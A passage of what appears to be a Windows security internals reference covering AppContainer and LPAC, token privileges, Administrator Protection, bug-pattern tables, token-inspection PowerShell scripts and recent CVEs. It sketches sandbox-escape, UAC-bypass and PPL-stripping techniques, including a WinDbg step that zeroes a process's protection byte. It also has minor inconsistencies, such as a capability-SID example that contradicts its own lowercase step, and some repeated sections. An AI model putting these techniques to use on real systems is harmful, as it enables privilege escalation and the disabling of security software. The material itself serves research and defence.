**Practical implication:** Most system objects were initially audited and hardened for standard AppContainer (`S-1-15-2-1`). LPAC removes that group entirely. The Edge render process runs in LPAC. Most historical AppContainer escape research involves finding objects that grant `S-1-15-2-1:WRITE` but not specifically a restrictive LPAC-safe grant.

```powershell
# Check if a named pipe or object is accessible to ALL_APP_PACKAGES
$sd = Get-NtSecurityDescriptor -Path "\Device\NamedPipe\SomePipe" -TypeName NamedPipe
$sd.Dacl | Where-Object { $_.Sid.ToString() -match "S-1-15-2-1" }
```

### 7.3 Capability SIDs — Naming and Derivation

Capability SIDs follow the authority `S-1-15-3-*`. Simple capabilities are assigned sequential RIDs:

| Capability | SID |
|-----------|-----|
| internetClient | S-1-15-3-1 |
| internetClientServer | S-1-15-3-2 |
| privateNetworkClientServer | S-1-15-3-3 |
| picturesLibrary | S-1-15-3-4 |
| videosLibrary | S-1-15-3-5 |
| musicLibrary | S-1-15-3-6 |
| documentsLibrary | S-1-15-3-7 |
| enterpriseAuthentication | S-1-15-3-8 |
| sharedUserCertificates | S-1-15-3-9 |
| removableStorage | S-1-15-3-10 |
| appointments | S-1-15-3-11 |
| contacts | S-1-15-3-12 |

Named capabilities (declared with `<Capability Name="...">` in manifest) use a SHA-256-derived SID. The derivation:
1. Lowercase the capability name
2. Prepend `"capability."` → `"capability.internetClient"`
3. Compute SHA-256 of the UTF-16LE encoded string
4. Take the first 5 DWORD values of the hash as the RID array
5. Build SID: `S-1-15-3-<d0>-<d1>-<d2>-<d3>-<d4>`

This is why capability SIDs like `webcam` appear as multi-component SIDs — they are hash-derived.

```powershell
# Inspect AppContainer token capabilities
$token = Get-NtToken -Current
$token.AppContainerSid                    # Package SID
$token.Capabilities                       # All capability SIDs with attributes
$token.Capabilities | ForEach-Object {
    Write-Host "  Capability: $($_.Sid) Attrs: $($_.Attributes)"
}

# Check if running inside AppContainer
$token.IsAppContainer
$token.AppContainerNumber                 # Numeric container ID
```

### LPAC (Less Privileged AppContainer) — Summary

LPAC removes even the `ALL APPLICATION PACKAGES` / `ALL RESTRICTED APPLICATION PACKAGES` grants, limiting access further. The Edge render process runs in LPAC. Most AppContainer escape vulnerabilities involve finding objects that grant `ALL APPLICATION PACKAGES` access without the LPAC exception.

### 7.4 Escape Patterns — Classic

- Object with `ALL APPLICATION PACKAGES: WRITE` but not LPAC-aware → AppContainer can write, LPAC process cannot
- COM server registered accessible to AppContainer but implementing a dangerous operation
- Named pipe with `ALL APPLICATION PACKAGES: CONNECT` → AppContainer can connect and impersonate

### 7.5 AppContainer Escape Research — 2024–2025

#### CVE-2024-21399 (February 2024) — Microsoft Edge Sandbox Escape
**CVSS:** 8.3. An AppContainer sandbox escape in the Microsoft Edge (Chromium-based) browser. Exploited by a malicious web page within the Edge renderer (LPAC) to break out of the AppContainer boundary and execute code in a Medium-IL context. Patched in Edge update released February 2024.

The vulnerability class involved a boundary crossing between the LPAC-isolated renderer process and the broker process through an insufficiently validated inter-process communication channel. The IPC endpoint had an ACE granting access to a capability SID that was present in the renderer's token, but the method handler did not enforce appropriate restrictions on what the renderer could request.

#### COM Activation Bypass (itm4n research, early 2025)
Researcher itm4n documented a technique where capability SID misconfiguration in COM server activation policies allows an AppContainer process to activate a COM server it should not have access to, then use that server's elevated context to escape the sandbox.

**Core concept:**
```
1. Identify a COM class registered with an activation DACL that grants access
   to a specific capability SID (not just ALL_APPLICATION_PACKAGES)
2. If the AppContainer token contains that capability SID, COM activation succeeds
   even for privileged COM servers
3. If the COM server's method implementations do not validate the caller's
   AppContainer context, the server executes privileged operations on behalf of
   the AppContainer process
```

**Research blog:** https://itm4n.github.io (search for AppContainer / COM activation posts from early 2025)

#### Windows Filtering Platform (WFP) Network Isolation Bypass
The AppContainer sandbox is supposed to enforce network isolation — only capabilities like `internetClient` should allow outbound connections. This isolation is implemented via Windows Filtering Platform (WFP) callout drivers.

Misconfigured WFP rules (or rules added by third-party security software) can inadvertently allow AppContainer processes to make network connections that bypass capability checks:

```
Attack scenario:
1. Third-party firewall or VPN driver adds a WFP permit rule too broadly
   (e.g., permits all TCP from any process to a specific IP range)
2. AppContainer process without internetClient capability can now connect
   to addresses in that range because the WFP permit fires before the
   AppContainer isolation callout
3. If those addresses include attacker infrastructure, data exfiltration
   or C2 communication becomes possible from sandboxed context
```

#### Symbolic Link / Object Manager Attack (ZDI, Q1 2024 — Patched)
A ZDI disclosure in Q1 2024 documented an Object Manager namespace symbolic link attack where an AppContainer process could create object directory entries in a location that would be followed by a privileged process, leading to an out-of-sandbox file write. Patched in the Q1 2024 Patch Tuesday cycle.

#### AppContainer Escape Attack Surface — 2024 Summary

| Vector | Status as of 2025 |
|--------|-------------------|
| WFP Rule Abuse (network bypass) | Partially mitigated — depends on third-party drivers |
| COM Server Activation abuse | Patches ongoing — new instances found regularly |
| RPC endpoint exposure | Active research area — several disclosures in 2024 |
| Symbolic link / Object Manager | Patched Q1 2024 |
| Edge Chromium sandbox escape CVE-2024-21399 | Patched February 2024 |
| Capability SID misconfiguration | Ongoing audit work — some gaps remain |

---

## 8. SeImpersonatePrivilege and Why It Matters

`SeImpersonatePrivilege` is the single most important privilege for Windows LPE research.

**What it enables:** A process with this privilege can call `ImpersonateNamedPipeClient`, `ImpersonateSelf`, `ImpersonateLoggedOnUser`, and related functions to assume the identity of any client that connects to it.

**Who has it by default:**
- `NT AUTHORITY\NETWORK SERVICE` — network-facing services (IIS, SQL Server, etc.)
- `NT AUTHORITY\LOCAL SERVICE`
- `NT AUTHORITY\SERVICE` group (all services)
- IIS application pool identities

**Who doesn't have it:**
- Standard user accounts
- Any account from which most web application server-side code runs

**Why service accounts have it:** Because services need to impersonate clients to access resources on their behalf (e.g., a file server impersonating the user to check if they can read a file).

**Potato exploit prerequisite:** All Potato variants require the attacker's process to have `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`). This is why these exploits target IIS/MSSQL/SQL service contexts — those accounts have the privilege.

**Checking for SeImpersonatePrivilege:**
```cmd
whoami /priv | findstr SeImpersonatePrivilege
```

```powershell
(Get-NtToken).Privileges | Where-Object {$_.Name -eq "SeImpersonatePrivilege"}
```

---

## 9. Administrator Protection (Windows 11 24H2)

Administrator Protection is the most significant change to the Windows security model in 2024. It is a preview feature in Windows 11 24H2 that fundamentally redesigns how administrative elevation works, addressing the core weaknesses in the traditional UAC model.

> **Bypass research:** ch12 §12.8 (variant hunting for Admin Protection bypass). ch13 (no case study yet — first bypasses appeared 2025).

### The Problem Administrator Protection Solves

Under traditional UAC, when an administrator elevates a task:
1. The same user account's existing token is promoted to High IL
2. The elevated token remains associated with the same logon session
3. The token persists for the duration of the elevated process
4. Malware running in the same session context can potentially steal or abuse the elevated token

The elevated token is not truly isolated — it belongs to the same account and can be reached by other processes in the same session via token handles, named pipe impersonation, or process injection.

### Technical Implementation — JIT Temporary Account Model

Administrator Protection takes a fundamentally different approach: instead of elevating the existing user's token, Windows creates a brand new temporary local administrator account for each elevation request.

```
Step-by-step elevation under Administrator Protection:

1. User or application requests elevation
   (e.g., runs a setup.exe with requireAdministrator manifest)

2. Windows determines elevation is required
   → AppInfo service creates a BRAND NEW temporary local user account
   → The account has a unique, randomly generated name
   → The account is added to the local Administrators group

3. Windows Hello authentication
   → User must authenticate via Windows Hello (biometric or PIN)
   → This is a CRYPTOGRAPHIC proof of user intent — not a simple UI click
   → Without enrolled Windows Hello, Administrator Protection cannot be used

4. JIT token creation
   → A unique isolated access token is created for the temporary account
   → Token has High integrity level
   → Token is NOT linked to the user's existing Medium-IL logon session

5. Elevated process execution
   → The process (e.g., setup.exe) runs under the TEMPORARY ACCOUNT's token
   → It has admin privileges but is completely isolated from the user's session
   → The user's original Medium-IL session continues unaffected

6. Cleanup on exit
   → When the elevated process exits:
      - The JIT token is immediately destroyed
      - The temporary local account is immediately deleted
      - No persistent admin token remains anywhere in the system
```

**Key difference from UAC:** UAC switches *which token* the same account uses. Administrator Protection creates an entirely *separate account* that exists only for the duration of the elevated task. There is no persistent token for malware to steal because the token is destroyed when the process exits.

### UAC vs Administrator Protection Comparison

| Characteristic | UAC | Administrator Protection |
|----------------|-----|--------------------------|
| Authentication type | UI click (consent dialog) | Windows Hello (biometric/PIN — cryptographic) |
| Token creation mechanism | Switch existing user token to High IL | Create new JIT temporary local account + token |
| Token isolation | Same account, different privilege level | Completely separate account |
| Silent elevation | Possible for whitelisted binaries | Blocked — all elevations require Windows Hello |
| Token lifetime | Persists for duration of elevated process | Destroyed immediately when process exits |
| Malware token theft | Can steal persistent elevated token from same session | Token is destroyed — nothing left to steal |
| Session isolation | Elevated process shares user's logon session | Elevated process runs in isolated session |
| Installer detection bypass | Possible via manifest manipulation | Significantly harder — requires Hello auth |
| Hardware dependency | None | Requires Windows Hello (TPM recommended) |
| Legacy app compatibility | High | Potentially lower — some apps assume same user context |

### Enabling Administrator Protection via Group Policy

Administrator Protection is not enabled by default in Windows 11 24H2. It must be explicitly configured:

```
Computer Configuration
→ Windows Settings
→ Security Settings
→ Local Policies
→ Security Options
→ "User Account Control: Configure type of Admin Approval Mode"
→ Set value to: "Administrator Protection mode"
```

**Prerequisites:**
1. Windows 11 24H2 (build 26100 or later)
2. Windows Hello must be configured for the user (biometric enrollment or PIN set)
3. Without Windows Hello, the elevation prompt will ask for the user's password instead — degraded experience

```powershell
# Check if Administrator Protection is enabled via registry
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$value = Get-ItemProperty -Path $regPath -Name "TypeOfAdminApprovalMode" -ErrorAction SilentlyContinue
if ($value) {
    switch ($value.TypeOfAdminApprovalMode) {
        0 { Write-Host "UAC Admin Approval Mode: Disabled" }
        1 { Write-Host "UAC Admin Approval Mode: Default UAC (Filtered token)" }
        2 { Write-Host "UAC Admin Approval Mode: Administrator Protection (JIT token)" }
    }
}
```

### Bypass Research 2024–2025

Despite the stronger design, Administrator Protection has known bypass vectors:

#### CVE-2025-21204 (April 2025) — Symlink Race Condition
**CVSS:** 7.8. A symbolic link / junction attack during Windows Update processing that affects both traditional UAC and Administrator Protection.

```
Timeline:
1. Administrator Protection creates a temporary admin account
2. Windows Update or an MSI installer (triggered by elevation) processes files
3. Attacker plants a directory junction or NTFS symlink at the target write path
   BEFORE the elevated process writes to it
4. Elevated process follows the junction → writes to attacker-chosen location
5. Result: privileged file write independent of the token mechanism
```

The vulnerability is in the *what the elevated process does*, not in the token creation mechanism itself. Administrator Protection's JIT token model does not protect against symlink races in the elevated process's code.

#### Legacy COM Elevation Techniques
Several COM elevation monikers and whitelisted COM objects that bypass UAC also bypass Administrator Protection in specific configurations. The COM activation path that does not require a consent prompt (auto-elevation for whitelisted CLSIDs) can in some cases fire without triggering the Windows Hello requirement.

#### Temporary Admin Token Abuse During the Execution Window
Administrator Protection destroys the token when the elevated process exits — but during the brief window when the elevated process is running, the token exists. Attack vectors during this window:

- **Named pipe impersonation:** If the elevated process creates a named pipe and can be coerced to connect to an attacker-controlled pipe, impersonation of the JIT token is possible while it exists.
- **Process injection during execution:** If code injection into the elevated process succeeds while it is running, the injected code executes under the JIT token.

The window is short — typically seconds — but automated attacks that monitor for elevated process creation via ETW or WMI can attempt exploitation within the window.

#### Installer Detection Bypass
Windows uses heuristics to detect whether a binary is an installer (file name contains "setup", "install", manifest content, etc.) and auto-elevates it. Under Administrator Protection, auto-elevation still triggers the Windows Hello prompt. However:

- Renaming or obfuscating a payload to avoid installer detection heuristics can bypass the elevation trigger
- If the payload is launched by an already-elevated process, it inherits the elevated context without a new Hello prompt

### Status and Deployment

As of Windows 11 24H2 (2025): **Preview feature, not enabled by default.** Enterprise deployments can enable it via Group Policy. Consumer users must manually enable it in Security settings. Full production deployment is expected in subsequent Windows releases.

**Sources:**
- https://learn.microsoft.com/en-us/windows/security/identity-protection/administrator-protection
- https://4sysops.com/archives/understanding-windows-11-24h2s-administrator-protection-feature/

---

## 10. Key Security APIs

```c
// Open a process's token
OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)

// Open the current thread's token (if impersonating)
OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)

// Duplicate a token (create copy at different impersonation level)
DuplicateTokenEx(hToken, ..., SecurityImpersonation, TokenImpersonation, &hImpToken)

// Impersonate a logged-on user (requires SeImpersonatePrivilege)
ImpersonateLoggedOnUser(hToken)

// Impersonate a named pipe client (requires SeImpersonatePrivilege)
ImpersonateNamedPipeClient(hPipe)

// Stop impersonating, revert to primary token
RevertToSelf()

// Create process with a different token (requires SeAssignPrimaryTokenPrivilege or SeImpersonatePrivilege)
CreateProcessWithTokenW(hToken, ...)

// Adjust token privileges
AdjustTokenPrivileges(hToken, FALSE, &newState, ...)

// Query token information
GetTokenInformation(hToken, TokenUser, ...)
GetTokenInformation(hToken, TokenPrivileges, ...)
GetTokenInformation(hToken, TokenIntegrityLevel, ...)

// Access check (user mode)
AccessCheck(pSD, hToken, DesiredAccess, ...)

// Create restricted token
CreateRestrictedToken(
    hExistingToken,
    DISABLE_MAX_PRIVILEGE | SANDBOX_INERT,
    nDisableSidCount,    pSidsToDisable,
    nDeletePrivilegeCount, pPrivilegesToDelete,
    nRestrictedSidCount, pRestrictedSids,
    &hRestrictedToken
)

// Filter token (native)
NtFilterToken(hToken, flags, pSidsToDisable, pPrivilegesToDelete, pRestrictedSids, &hFiltered)
```

---

## 11. Security Model Bug Patterns

| Bug Pattern | Description | Example |
|-------------|-------------|---------|
| Missing impersonation before privileged operation | Service performs file/registry operation without calling `ImpersonateClient()` first — runs as SYSTEM | CVE-2020-0787 (BITS), CVE-2020-0668 (Service Tracing) |
| Wrong impersonation level check | Server accepts client connection but doesn't verify impersonation level ≥ Impersonation | Named pipe server that works even with Identification-level clients |
| Token privilege abuse | Process retains a dangerous privilege it shouldn't need — attacker finds an API that exploits it | PrintSpoofer: `SeImpersonatePrivilege` on IIS → SYSTEM |
| NULL/weak DACL on shared object | Privileged object has world-writable DACL | `\BasedNamedObjects\SomePipe` with `Everyone:WRITE_DACL` |
| Integrity level bypass | MIC policy missing or incorrect on sensitive object | Write operation to High-IL object from Medium process |
| COM activation identity confusion | COM server activates as wrong identity | COM server that runs as SYSTEM but is activatable by any user |
| Restricted token not checked | Access check only validates main SID list, not restricted SIDs | Privilege bypass via unrestricted token fork |
| AppContainer escape via ALL_APP_PACKAGES | Object grants write to `ALL APPLICATION PACKAGES` without exception for LPAC | Sandbox escape from Edge renderer |
| Missing impersonation before file move (BITS pattern) | SYSTEM-level service moves a file on behalf of a user without calling `ImpersonateClient()` — attacker can use NTFS junction to redirect the destination path to a privileged location | CVE-2020-0787: BITS `MoveFileExW` without impersonation; attacker-controlled source + junction destination → arbitrary SYSTEM file write |
| Named pipe DACL too permissive | Pipe server sets `Everyone:FILE_ALL_ACCESS` on its pipe object | Any process (including sandboxed) can connect, send commands, and get impersonated |
| Token privilege escalation in wrong context | A process or COM server running at High IL retains `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` after delegating work to a lower-trust component | IIS worker process impersonation token leaking to user code via P/Invoke |
| Restricted token escape via handle inheritance | A restricted process spawns a child with `PROC_THREAD_ATTRIBUTE_HANDLE_LIST`, inadvertently including a handle to an unrestricted token object — child can use `DuplicateHandle` on inherited token handle to escape restriction | Child process in sandbox receives an open `TOKEN_DUPLICATE` handle via inheritance |
| NULL DACL on kernel object | Kernel object (event, mutex, semaphore, mapping) created with `NULL` security descriptor — any process including sandboxed ones can open it and signal/corrupt shared state | Service creates an event with `NULL` SD; AppContainer can `OpenEvent` → signal it → trigger privileged code path |
| COM server running as SYSTEM activatable by any user | COM class registered with `LocalService`/`LocalSystem` activation but `AccessPermission` in registry is either absent or set to `Everyone:LAUNCH_ACTIVATE` | COM LPE: user instantiates SYSTEM COM object via standard CoCreateInstance, object methods execute as SYSTEM |
| Environment variable abuse in elevated process | Auto-elevated process expands `%TEMP%` or `%PATH%` in a file load path; user can set env vars before launch | Elevated process calls `LoadLibrary("%TEMP%\\helper.dll")` → user writes malicious DLL to temp dir |
| Symlink race during privileged write | Elevated process writes to a path that attacker redirects via junction/symlink before the write | CVE-2025-21204: symlink planted before Windows Update elevated write |
| PPL EPROCESS flag overwrite | Kernel exploit provides arbitrary R/W → attacker zeros EPROCESS.Protection byte → PPL process becomes unprotected | CVE-2024-21338: appid.sys exploit by Lazarus Group to kill EDR PPL |

---

## 12. Practical Token Manipulation Workflow

This section provides a structured workflow for enumerating and analyzing tokens during security research or vulnerability analysis.

### 12.1 Full Token Inspection

```powershell
Import-Module NtObjectManager

function Inspect-Token {
    param([NtApiDotNet.NtToken]$Token)

    Write-Host "=== TOKEN INSPECTION ===" -ForegroundColor Cyan

    # Basic identity
    Write-Host "`n[Identity]"
    Write-Host "  User:            $($Token.User.Sid) ($($Token.User.Sid.Name))"
    Write-Host "  Token Type:      $($Token.TokenType)"
    Write-Host "  Impersonation:   $($Token.ImpersonationLevel)"
    Write-Host "  Integrity Level: $($Token.IntegrityLevel)"
    Write-Host "  Session ID:      $($Token.SessionId)"
    Write-Host "  Is Restricted:   $($Token.IsRestricted)"
    Write-Host "  Is AppContainer: $($Token.IsAppContainer)"

    # Groups
    Write-Host "`n[Groups]"
    $Token.Groups | Sort-Object { $_.Sid.ToString() } | ForEach-Object {
        $attrs = $_.Attributes.ToString()
        Write-Host "  $($_.Sid.Name.PadRight(50)) [$attrs]"
    }

    # Privileges
    Write-Host "`n[Privileges]"
    $Token.Privileges | Sort-Object Name | ForEach-Object {
        $state = if ($_.Attributes -band [NtApiDotNet.PrivilegeAttributes]::Enabled) { "ENABLED" } else { "disabled" }
        Write-Host "  $($_.Name.PadRight(40)) [$state]"
    }

    # Restricted SIDs (if any)
    if ($Token.IsRestricted) {
        Write-Host "`n[RestrictedSids]"
        $Token.RestrictedSids | ForEach-Object {
            Write-Host "  $($_.Sid) ($($_.Sid.Name))"
        }
    }

    # AppContainer info (if applicable)
    if ($Token.IsAppContainer) {
        Write-Host "`n[AppContainer]"
        Write-Host "  Package SID:   $($Token.AppContainerSid)"
        Write-Host "  Container Num: $($Token.AppContainerNumber)"
        Write-Host "  Capabilities:"
        $Token.Capabilities | ForEach-Object {
            Write-Host "    $($_.Sid)"
        }
    }
}

# Inspect current process token
$tok = Get-NtToken -Primary
Inspect-Token $tok
$tok.Close()
```

### 12.2 Find Processes with Interesting Privileges

```powershell
Import-Module NtObjectManager

# Privileges worth hunting for
$interestingPrivs = @(
    "SeDebugPrivilege",
    "SeImpersonatePrivilege",
    "SeAssignPrimaryTokenPrivilege",
    "SeLoadDriverPrivilege",
    "SeBackupPrivilege",
    "SeRestorePrivilege",
    "SeTakeOwnershipPrivilege",
    "SeCreateTokenPrivilege",
    "SeTcbPrivilege",
    "SeRelabelPrivilege"
)

Write-Host "Scanning processes for interesting privileges..." -ForegroundColor Yellow

Get-NtProcess -Access QueryLimitedInformation | ForEach-Object {
    $proc = $_
    try {
        $tok = Get-NtToken -Process $proc -Access Query -Duplicate
        $found = $tok.Privileges | Where-Object {
            $interestingPrivs -contains $_.Name
        }
        if ($found) {
            Write-Host "`nProcess: $($proc.Name) [PID $($proc.ProcessId)]" -ForegroundColor Green
            Write-Host "  User: $($tok.User.Sid.Name)"
            Write-Host "  Integrity: $($tok.IntegrityLevel)"
            $found | ForEach-Object {
                $state = if ($_.Attributes -band [NtApiDotNet.PrivilegeAttributes]::Enabled) {
                    "ENABLED" } else { "present/disabled" }
                Write-Host "  >> $($_.Name) [$state]" -ForegroundColor Yellow
            }
        }
        $tok.Close()
    } catch { }
    $proc.Close()
}
```

### 12.3 Verify AppContainer Token Properties

```powershell
Import-Module NtObjectManager

function Test-AppContainerToken {
    param([NtApiDotNet.NtToken]$Token)

    Write-Host "AppContainer Token Analysis" -ForegroundColor Cyan

    # Is it an AppContainer at all?
    if (-not $Token.IsAppContainer) {
        Write-Host "  Not an AppContainer token." -ForegroundColor Red
        return
    }

    # Package identity
    Write-Host "  Package SID:       $($Token.AppContainerSid)"
    Write-Host "  Container Number:  $($Token.AppContainerNumber)"

    # Check for ALL_APP_PACKAGES group (S-1-15-2-1)
    $allAppPkgs = "S-1-15-2-1"
    $hasAllAppPkgs = $Token.Groups | Where-Object {
        $_.Sid.ToString() -eq $allAppPkgs -and
        ($_.Attributes -band [NtApiDotNet.GroupAttributes]::Enabled)
    }

    if ($hasAllAppPkgs) {
        Write-Host "  Type:              Standard AppContainer (has ALL_APP_PACKAGES)" -ForegroundColor Green
    } else {
        Write-Host "  Type:              LPAC (ALL_APP_PACKAGES removed or deny-only)" -ForegroundColor Yellow
    }

    # Check ALL_RESTRICTED_APP_PACKAGES (S-1-15-2-2)
    $allRestrictedPkgs = "S-1-15-2-2"
    $hasRestricted = $Token.Groups | Where-Object {
        $_.Sid.ToString() -eq $allRestrictedPkgs -and
        ($_.Attributes -band [NtApiDotNet.GroupAttributes]::Enabled)
    }
    Write-Host "  Has ALL_RESTRICTED_APP_PACKAGES: $($null -ne $hasRestricted)"

    # Capabilities
    Write-Host "`n  Capabilities ($($Token.Capabilities.Count) total):"
    $Token.Capabilities | ForEach-Object {
        Write-Host "    $($_.Sid)"
    }

    # Integrity (should be Low for standard AppContainer)
    Write-Host "`n  Integrity Level:   $($Token.IntegrityLevel)"
    Write-Host "  Is Restricted:     $($Token.IsRestricted)"
}

# Test on a UWP process
$uwpProc = Get-NtProcess -Name "ApplicationFrameHost.exe" -Access QueryLimitedInformation | Select-Object -First 1
if ($uwpProc) {
    $tok = Get-NtToken -Process $uwpProc -Duplicate -Access Query
    Test-AppContainerToken $tok
    $tok.Close()
    $uwpProc.Close()
}
```

### 12.4 Check If a Token Is Restricted

```powershell
function Test-RestrictedToken {
    param(
        [Parameter(Mandatory)]
        [NtApiDotNet.NtToken]$Token
    )

    Write-Host "Restricted Token Analysis" -ForegroundColor Cyan
    Write-Host "  IsRestricted: $($Token.IsRestricted)"

    if ($Token.IsRestricted) {
        Write-Host "  RestrictedSids count: $($Token.RestrictedSids.Count)"
        Write-Host "`n  RestrictedSids list:"
        $Token.RestrictedSids | ForEach-Object {
            Write-Host "    SID:   $($_.Sid)"
            Write-Host "    Name:  $($_.Sid.Name)"
            Write-Host "    Attrs: $($_.Attributes)"
        }

        Write-Host "`n  [!] Access check will require BOTH normal SID AND RestrictedSids to pass." -ForegroundColor Yellow
        Write-Host "  [!] Effective access = intersection of both SID list grants." -ForegroundColor Yellow
    } else {
        Write-Host "  Token is unrestricted — only normal DACL check applies." -ForegroundColor Green
    }
}

# Check current token
$tok = Get-NtToken -Primary
Test-RestrictedToken $tok
$tok.Close()
```

### 12.5 WinDbg Token Commands (Kernel-Mode)

```windbg
; Dump token for current process
!token

; Dump token by address
dt nt!_TOKEN <address>

; Get EPROCESS token field (pointer to _TOKEN, low bits are RefCnt — mask off with &~0xF)
; From current processor's PRCB → current thread → process → token
dt nt!_EPROCESS poi(poi(@$prcb+0x8)) Token

; Resolve token pointer (mask reference count bits)
r @$t0 = poi(poi(@$prcb+0x8)+0x4b8) & ~0xf
dt nt!_TOKEN @$t0

; Check privileges in token
dt nt!_SEP_TOKEN_PRIVILEGES poi(@$t0+<offset_of_Privileges>)

; Dump SIDs in UserAndGroups
dt nt!_TOKEN @$t0 UserAndGroups
; Walk the SID_AND_ATTRIBUTES array manually:
; poi(@$t0+<UserAndGroups_offset>) = pointer to SID_AND_ATTRIBUTES[0]

; Check integrity level (MandatoryPolicy field in token)
dt nt!_TOKEN @$t0 MandatoryPolicy
; Then find IntegrityLevelIndex — look at IntegrityLevelIndex field
; The actual IL SID is at UserAndGroups[IntegrityLevelIndex].Sid

; Check if restricted token (RestrictedSidCount > 0)
dt nt!_TOKEN @$t0 RestrictedSidCount
dt nt!_TOKEN @$t0 RestrictedSids

; Dump AppContainer SID
dt nt!_TOKEN @$t0 AppContainerSid

; Check trust level (PPL)
dt nt!_TOKEN @$t0 TrustLevelSid

; Check PPL protection on EPROCESS directly
dt nt!_EPROCESS poi(poi(@$prcb+0x8)) Protection
; Protection.Type: 0=None, 1=ProtectedLight, 2=Protected
; Protection.Signer: see PS_PROTECTED_SIGNER enum values

; Find and zero Protection byte (kernel R/W required — research context only)
; r @$t1 = (address of EPROCESS.Protection)
; eb @$t1 0x00
```

---

## 13. Recent Developments (2024–2025)

This section consolidates the most significant security model changes and CVEs from 2024–2025 that affect Windows security model research.

### 13.1 CVE Timeline

| CVE | Month | CVSS | Component | Impact |
|-----|-------|------|-----------|--------|
| CVE-2024-21338 | Feb 2024 | 7.8 | appid.sys (kernel) | Kernel R/W → PPL bypass, used by Lazarus Group |
| CVE-2024-21399 | Feb 2024 | 8.3 | Microsoft Edge | AppContainer sandbox escape from LPAC renderer |
| CVE-2024-26218 | Apr 2024 | 7.8 | Windows Kernel | IL enforcement bypass affecting PPL |
| CVE-2024-6769 | 2024 | 6.3 | UAC mechanism | Drive remap + SxS DLL + COM chain UAC bypass |
| CVE-2024-38100 | Jul 2024 | 7.8 | File Explorer | Shell extension EoP to High IL |
| CVE-2025-21204 | Apr 2025 | 7.8 | Windows Update / Process Activation | Symlink/junction EoP — affects UAC and Admin Protection |

### 13.2 Architecture Changes in 24H2

**Administrator Protection (Preview):**
The JIT temporary account model replaces token promotion for admin elevation. See §9 for full details. This is the most significant change to the elevation model since UAC was introduced in Vista.

**PPL Partial VTL1 Backing:**
On HVCI-capable hardware, PPL protection flags for certain signer levels are now partially validated by the Secure Kernel (VTL1). Direct EPROCESS memory writes in VTL0 kernel space do not fully defeat protection if VTL1 is actively monitoring the integrity of protection state. The practical implication for exploit developers:

```
Old model: kernel R/W → zero EPROCESS.Protection → PPL bypassed
New model (24H2 on HVCI hardware): kernel R/W → zero EPROCESS.Protection 
  → VTL1 may re-enforce protection on next access check
  → More complex exploit chains needed (VTL1 compromise or time-window attack)
```

**Windows Server 2025 MIC Changes:**
SMB and RPC interfaces on Windows Server 2025 received stricter MIC enforcement. Remote callers must meet minimum integrity requirements. This primarily affects lateral movement scenarios where an attacker has code execution at a lower integrity level on a remote machine.

### 13.3 Threat Actor Usage of Security Model Bugs in 2024

**Lazarus Group (CVE-2024-21338):**
North Korean state actor exploited a kernel vulnerability in `appid.sys` to strip PPL protection from security software processes, enabling credential theft from LSASS without relying on BYOVD (which is more easily detected by modern EDR telemetry).

**LockBit / BlackBasta (COM Object Hijacking):**
Ransomware affiliates documented using COM object hijacking against auto-elevated processes (`computerdefaults.exe`, `sdclt.exe`) as their standard UAC bypass. HKCU-based COM registration has no detection signature at the OS level — only behavioral analysis can catch it.

**General red team commodity (MockDirs):**
The `C:\Windows \System32\` trailing-space technique remains unpatched and is now part of multiple commercial red team toolkits. Microsoft has historically not treated MockDirs as a security boundary violation because UAC is not a security boundary in their model.

### 13.4 Research Tools and References for 2024–2025

| Tool / Resource | Purpose | URL |
|-----------------|---------|-----|
| UACME | Comprehensive UAC bypass method collection | https://github.com/hfiref0x/UACME |
| PPLcontrol | PPL inspection and manipulation | https://github.com/itm4n/PPLcontrol |
| itm4n blog | AppContainer, COM activation, PPL research | https://itm4n.github.io |
| NtObjectManager | Token, access check, AppContainer analysis | https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools |
| Administrator Protection docs | Microsoft official feature docs | https://learn.microsoft.com/en-us/windows/security/identity-protection/administrator-protection |
| 4sysops Admin Protection | Practical deployment analysis | https://4sysops.com/archives/understanding-windows-11-24h2s-administrator-protection-feature/ |

---

## WinDbg Token Commands

```windbg
; Dump token for current process
!token

; Dump token by address
dt nt!_TOKEN <address>

; Get EPROCESS token field
dt nt!_EPROCESS poi(@$prcb+0x8)

; Dump token from EPROCESS
dt nt!_TOKEN poi(poi(@$prcb+0x8)+0x4b8)&~0xf)

; Check integrity level (look at IntegrityLevelIndex in token)
dt nt!_SEP_TOKEN_PRIVILEGES <addr>
```

---

## References

- [R-1] Windows Security Internals — James Forshaw (No Starch, 2023) — https://nostarch.com/windows-security-internals
- [R-2] sandbox-attacksurface-analysis-tools — Forshaw / Project Zero — https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools
- [R-3] Access Control documentation — Microsoft — https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control
- [R-4] Privilege Constants — Microsoft — https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
- [R-5] Windows Internals Part 1, Ch.7 Security — Russinovich et al.
- [R-6] Abusing Token Privileges for LPE — foxglovesecurity — https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
- [R-7] Google Project Zero blog — https://googleprojectzero.blogspot.com/
- [R-8] AppContainer Isolation — Microsoft — https://learn.microsoft.com/en-us/windows/win32/secauthz/appcontainer-isolation
- [R-9] Protected Processes — Alex Ionescu — https://www.alex-ionescu.com/?p=97
- [R-10] UAC Internals and Bypass Techniques — Tyranid's Nest — https://www.tiraniddo.dev/
- [R-11] Token Kidnapping / Potato Exploits — Foxglove / ohpe.it — historical CVE analysis
- [R-12] Administrator Protection — Microsoft — https://learn.microsoft.com/en-us/windows/security/identity-protection/administrator-protection
- [R-13] Understanding Windows 11 24H2 Administrator Protection — 4sysops — https://4sysops.com/archives/understanding-windows-11-24h2s-administrator-protection-feature/
- [R-14] UACME — hfiref0x — https://github.com/hfiref0x/UACME
- [R-15] PPLcontrol — itm4n — https://github.com/itm4n/PPLcontrol
- [R-16] itm4n research blog (AppContainer, COM activation, PPL) — https://itm4n.github.io
- [R-17] CVE-2024-21338 (appid.sys PPL bypass, Lazarus Group) — NVD — https://nvd.nist.gov/vuln/detail/CVE-2024-21338
- [R-18] CVE-2024-21399 (Edge AppContainer escape) — MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21399
